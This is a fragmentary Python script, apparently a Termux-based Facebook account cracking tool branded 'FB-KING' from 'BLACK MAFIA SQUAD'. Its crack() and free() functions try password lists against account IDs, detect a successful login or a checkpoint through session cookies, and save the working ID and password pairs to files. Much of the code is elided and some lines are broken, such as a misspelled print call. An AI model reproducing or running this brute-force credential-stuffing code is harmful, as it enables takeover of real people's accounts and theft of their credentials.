...
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.FB-KING-cov', 'r').read()
finally:
    pass
kok = open('/data/data/com.termux/files/usr/bin/.FB-KING-cov', 'w')
kok.write(myid + imt)
kok.close()
...
def crack(idf, pwv):
    ...
    fff = '%'
    (sys.stdout.write('\r %s[START HACK] %s\xe2\x80\xa2%s \xe2\x80\xa2 OK:%s \xe2\x80\xa2 CP:%s  ' % (bi, loop, len(id2), len(ok), cp)),)
    sys.stdout.flush()
    ...
    for pw in pwv:
        ...
        if 'c_user' in ses.cookies.get_dict().keys():
            ...
            wrt = '%s - %s' % (idf, pw)
            ok.append(wrt)
            print('Successful \x1b[1;31mHACKED')
...
def free(idf, pwv):
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                rint(f'''\r\x1b[1;92m [FB-KING-Ok] {idf} | {pw}''')
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
        finally:
            pass
...
logo = '\n\x1b[1;33m ####### ######        #    # ### #     #  #####  \n\x1b[1;32m #       #     #       #   #   #  ##    # #     # \n\x1b[1;31m #       #     #       #  #    #  # #   # #       \n\x1b[1;34m #####   ######  ##### ###     #  #  #  # #  #### \n\x1b[1;35m #       #     #       #  #    #  #   # # #     # \n\x1b[1;36m #       #     #       #   #   #  #    ## #     # \n\x1b[1;32m #       ######        #    # ### #     #  #####  \n                                                  \n_________________\xf0\x9f\x98\x83\xf0\x9f\x98\xaa\xf0\x9f\x98\x88______________________\n  \n[\xf0\x9f\x8d\x81]\x1b[95;1m Auther      :  FB-KING \xf0\x9f\x99\x82\n\n[\xf0\x9f\x93\xa8] \x1b[94;1mGRP         :  BLACK MAFIA SQUAD\n\n[\xf0\x9f\x94\x94]\x1b[